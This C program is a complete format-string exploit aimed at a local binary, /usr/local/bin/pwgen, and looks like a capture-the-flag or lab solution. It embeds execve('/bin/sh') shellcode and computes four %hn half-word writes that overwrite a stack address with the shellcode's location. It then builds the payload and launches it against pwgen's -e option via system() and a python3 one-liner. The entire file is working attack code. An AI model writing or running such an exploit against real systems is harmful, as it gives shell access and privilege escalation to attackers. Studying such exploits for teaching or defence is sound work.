#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

// Your shellcode – stored in this binary so that its address is fixed.
unsigned char shellcode[] =
    "\x6a\x3b\x58\x48\x31\xd2\x49"
    "\xb8\x2f\x2f\x62\x69\x6e\x2f"
    "\x73\x68\x49\xc1\xe8\x08\x41"
    "\x50\x48\x89\xe7\x52\x57\x48"
    "\x89\xe6\x0f\x05\x6a\x3c\x58"
    "\x48\x31\xff\x0f\x05";

// The target address in pwgen's stack that we wish to overwrite.
// (For example, the saved return address from parse_args.)
#define TARGET_ADDR 0x555555556150ULL

int main(void) {
    // Print the shellcode address.
    printf("Shellcode is at address: %p\n", shellcode);
    unsigned long long shell_addr = (unsigned long long) shellcode;

    // Extract 16-bit segments (half-words) from the shellcode's address.
    unsigned int seg0 = shell_addr & 0xffff;            // lowest 16 bits: to be written at TARGET_ADDR
    unsigned int seg1 = (shell_addr >> 16) & 0xffff;      // next 16 bits: to be written at TARGET_ADDR+2
    unsigned int seg2 = (shell_addr >> 32) & 0xffff;      // next 16 bits: to be written at TARGET_ADDR+4
    unsigned int seg3 = (shell_addr >> 48) & 0xffff;      // highest 16 bits: to be written at TARGET_ADDR+6

    printf("Desired half-words:\n");
    printf(" seg0: 0x%04x\n", seg0);
    printf(" seg1: 0x%04x\n", seg1);
    printf(" seg2: 0x%04x\n", seg2);
    printf(" seg3: 0x%04x\n", seg3);

    /*
     * We choose an ordering that helps us ensure that the printed count increases.
     * For this example, we write in the order: seg1, seg2, seg0, seg3.
     * That means:
     *   - Write seg1 to TARGET_ADDR+2
     *   - Write seg2 to TARGET_ADDR+4
     *   - Write seg0 to TARGET_ADDR
     *   - Write seg3 to TARGET_ADDR+6
     *
     * The initial printed count is the length of our addresses block:
     * 4 addresses * 8 bytes each = 32.
     */
    int initial_count = 32;
    int printed = initial_count;

    // For each segment, we want the running printed count to match the desired value.
    // If the natural value is too low, add 0x10000 until it exceeds the current printed count.
    int desired1 = seg1; while (desired1 < printed) desired1 += 0x10000;
    int desired2 = seg2; while (desired2 < desired1) desired2 += 0x10000;
    int desired0 = seg0; while (desired0 < desired2) desired0 += 0x10000;
    int desired3 = seg3; while (desired3 < desired0) desired3 += 0x10000;

    // Calculate the extra padding needed for each write.
    int pad1 = desired1 - printed; printed += pad1;
    int pad2 = desired2 - printed; printed += pad2;
    int pad0 = desired0 - printed; printed += pad0;
    int pad3 = desired3 - printed; printed += pad3;

    printf("Computed paddings (in characters):\n");
    printf(" pad1: %d\n", pad1);
    printf(" pad2: %d\n", pad2);
    printf(" pad0: %d\n", pad0);
    printf(" pad3: %d\n", pad3);

    // Build the payload.
    // First, we place the four target addresses in the order corresponding to our chosen writes.
    char payload[1024];
    memset(payload, 0, sizeof(payload));
    int offset = 0;
    unsigned long long addr1 = TARGET_ADDR + 2;  // for seg1
    unsigned long long addr2 = TARGET_ADDR + 4;  // for seg2
    unsigned long long addr0 = TARGET_ADDR;      // for seg0
    unsigned long long addr3 = TARGET_ADDR + 6;  // for seg3

    memcpy(payload + offset, &addr1, 8); offset += 8;
    memcpy(payload + offset, &addr2, 8); offset += 8;
    memcpy(payload + offset, &addr0, 8); offset += 8;
    memcpy(payload + offset, &addr3, 8); offset += 8;

    // Next, append the format string.
    // Here we assume that these 4 addresses appear on the stack starting at parameter number 423.
    int base_param = 423;
    char fmt[512];
    snprintf(fmt, sizeof(fmt),
             "%%%dx%%%d$hn%%%dx%%%d$hn%%%dx%%%d$hn%%%dx%%%d$hn",
             pad1, base_param,
             pad2, base_param + 1,
             pad0, base_param + 2,
             pad3, base_param + 3);
    strcpy(payload + offset, fmt);
    offset += strlen(fmt);

    // For debugging: dump the payload in hex.
    printf("Payload (hex dump):\n");
    for (int i = 0; i < offset; i++) {
        printf("\\x%02x", (unsigned char)payload[i]);
    }
    printf("\n");

    // Build a Python one-liner to print the payload as raw bytes.
    // The resulting command will be used with pwgen's -e flag.
    char py_payload[4096];
    char *p = py_payload;
    p += sprintf(p, "import sys; sys.stdout.buffer.write(b\"");
    for (int i = 0; i < offset; i++) {
        p += sprintf(p, "\\x%02x", (unsigned char)payload[i]);
    }
    p += sprintf(p, "\")");

    // Construct the final command.
    // IMPORTANT: There is no space between -e and the command substitution.
    char command[4096];
    snprintf(command, sizeof(command),
             "/usr/local/bin/pwgen -e\"$(python3 -c '%s')\"",
             py_payload);

    printf("Executing command:\n%s\n", command);

    // Execute the command using system().
    int ret = system(command);
    if (ret == -1) {
        perror("system() failed");
        exit(1);
    }

    return 0;
}
